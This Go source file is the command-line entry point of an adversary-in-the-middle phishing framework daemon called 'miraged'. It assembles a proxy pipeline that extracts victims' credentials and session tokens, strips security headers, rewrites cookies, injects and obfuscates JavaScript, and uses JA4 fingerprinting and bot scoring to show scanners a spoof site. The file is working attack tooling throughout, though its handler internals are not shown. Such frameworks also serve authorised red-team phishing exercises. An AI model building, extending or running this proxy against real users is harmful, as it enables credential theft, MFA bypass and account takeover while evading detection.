package main

import (
	"context"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"

	"github.com/spf13/cobra"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/botguard"
	"github.com/travisbale/mirage/internal/cert"
	"github.com/travisbale/mirage/internal/config"
	"github.com/travisbale/mirage/internal/events"
	"github.com/travisbale/mirage/internal/proxy"
	"github.com/travisbale/mirage/internal/proxy/handlers/request"
	"github.com/travisbale/mirage/internal/proxy/handlers/response"
	"github.com/travisbale/mirage/internal/store/sqlite"
)

var Version = "dev"

func main() {
	var (
		configPath string
		debug      bool
		developer  bool
	)

	root := &cobra.Command{
		Use:          "miraged",
		Short:        "Mirage AiTM phishing framework daemon",
		RunE: func(cmd *cobra.Command, args []string) error {
			return runServe(cmd.Context(), configPath, debug, developer)
		},
		SilenceUsage: true,
	}

	root.PersistentFlags().StringVar(&configPath, "config", "/etc/mirage/miraged.yaml", "path to config file")
	root.PersistentFlags().BoolVar(&debug, "debug", false, "enable debug logging")
	root.PersistentFlags().BoolVar(&developer, "developer", false, "use self-signed certs (no ACME); safe for local testing")

	serveCmd := &cobra.Command{
		Use:   "serve",
		Short: "Start the miraged daemon",
		RunE: func(cmd *cobra.Command, args []string) error {
			return runServe(cmd.Context(), configPath, debug, developer)
		},
	}

	validateCmd := &cobra.Command{
		Use:   "validate",
		Short: "Validate the config file and exit",
		RunE: func(cmd *cobra.Command, args []string) error {
			cfg, err := config.Load(configPath)
			if err != nil {
				fmt.Fprintf(os.Stderr, "INVALID: %v\n", err)
				os.Exit(1)
			}
			if err := cfg.Validate(); err != nil {
				fmt.Fprintf(os.Stderr, "INVALID: %v\n", err)
				os.Exit(1)
			}
			fmt.Println("OK")
			return nil
		},
	}

	versionCmd := &cobra.Command{
		Use:   "version",
		Short: "Print the version and exit",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Println(Version)
		},
	}

	root.AddCommand(serveCmd, validateCmd, versionCmd)

	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGTERM, syscall.SIGINT)
	defer stop()

	if err := root.ExecuteContext(ctx); err != nil {
		os.Exit(1)
	}
}

func runServe(ctx context.Context, configPath string, debug, developer bool) error {
	logger := newLogger(debug)

	cfg, err := loadConfig(configPath)
	if err != nil {
		return err
	}

	bus := events.NewBus(events.DefaultBufferSize)

	db, err := sqlite.Open(cfg.DBPath)
	if err != nil {
		return fmt.Errorf("opening database: %w", err)
	}
	defer db.Close()

	caDir := filepath.Join(filepath.Dir(cfg.DBPath), "ca")
	certSource, err := cert.NewSource(developer, caDir, logger)
	if err != nil {
		return err
	}

	botGuardSvc, err := newBotGuardService(bus, sqlite.NewBotStore(db), logger)
	if err != nil {
		return err
	}

	sessionStore := sqlite.NewSessionStore(db)
	sessionSvc := aitm.NewSessionService(sessionStore, bus)
	blacklistSvc := aitm.NewBlacklistService(bus)
	phishletResolver := aitm.NewPhishletResolver(sqlite.NewPhishletStore(db), sqlite.NewLureStore(db))
	activeHostnames := &proxy.ActiveHostnameSet{}
	spoofProxy := proxy.NewSpoofProxy("")
	wsHub := proxy.NewWSHub(bus, logger)

	pipeline := buildPipeline(pipelineDeps{
		botGuardSvc:      botGuardSvc,
		blacklistSvc:     blacklistSvc,
		sessionSvc:       sessionSvc,
		sessionStore:     sessionStore,
		phishletResolver: phishletResolver,
		activeHostnames:  activeHostnames,
		spoofProxy:       spoofProxy,
		bus:              bus,
	}, logger)

	mitm := proxy.NewAiTMProxy(certSource, pipeline, wsHub, spoofProxy, logger)
	addr := fmt.Sprintf(":%d", cfg.HTTPSPort)

	logger.Info("starting AiTM proxy", "addr", addr)

	return mitm.Start(ctx, addr)
}

func newLogger(debug bool) *slog.Logger {
	level := slog.LevelInfo
	if debug {
		level = slog.LevelDebug
	}
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: level}))
	slog.SetDefault(logger)
	return logger
}

func loadConfig(path string) (*config.Config, error) {
	cfg, err := config.Load(path)
	if err != nil {
		return nil, fmt.Errorf("loading config: %w", err)
	}
	if err := cfg.Validate(); err != nil {
		return nil, fmt.Errorf("invalid config: %w", err)
	}
	return cfg, nil
}

func newBotGuardService(bus aitm.EventBus, botStore aitm.BotStore, logger *slog.Logger) (*aitm.BotGuardService, error) {
	bgCfg := botguard.BotGuardConfig{
		Enabled:            false, // disabled until sig DB is populated
		TelemetryThreshold: 0.6,
	}
	sigDB, err := botguard.NewJA4SignatureDB("", bus, logger)
	if err != nil {
		return nil, fmt.Errorf("initialising JA4 signature DB: %w", err)
	}
	scorer := botguard.NewScorer(bgCfg, sigDB, logger)
	return aitm.NewBotGuardService(scorer, botStore, bus), nil
}

type pipelineDeps struct {
	botGuardSvc      *aitm.BotGuardService
	blacklistSvc     *aitm.BlacklistService
	sessionSvc       *aitm.SessionService
	sessionStore     aitm.SessionStore
	phishletResolver *aitm.PhishletResolver
	activeHostnames  *proxy.ActiveHostnameSet
	spoofProxy       *proxy.SpoofProxy
	bus              aitm.EventBus
}

func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
	req := []proxy.RequestHandler{
		&request.JA4Extractor{},
		&request.BotGuardCheck{Service: d.botGuardSvc, Spoof: d.spoofProxy},
		&request.IPExtractor{},
		&request.BlacklistChecker{Service: d.blacklistSvc, Spoof: d.spoofProxy},
		&request.APIRouter{SecretHostname: "", Handler: http.NotFoundHandler()},
		&request.PhishletRouter{ActiveHostnameSet: d.activeHostnames, Resolver: d.phishletResolver, Spoof: d.spoofProxy},
		&request.LureValidator{Spoof: d.spoofProxy},
		&request.SessionResolver{Store: d.sessionStore, Factory: d.sessionSvc},
		&request.TelemetryScoreCheck{Scorer: d.botGuardSvc, Spoof: d.spoofProxy, Threshold: 0.6},
		&request.URLRewriter{},
		&request.CredentialExtractor{Store: d.sessionStore, Bus: d.bus},
		&request.ForcePostInjector{},
	}
	resp := []proxy.ResponseHandler{
		&response.SecurityHeaderStripper{},
		&response.CookieRewriter{},
		&response.SubFilterApplier{},
		&response.TokenExtractor{Store: d.sessionStore, Bus: d.bus, Completer: d.sessionSvc, Whitelist: d.blacklistSvc},
		&response.JSInjector{},
		&response.JSObfuscator{Obfuscator: &response.NoOpObfuscator{}},
	}
	return proxy.NewPipeline(req, resp, logger)
}
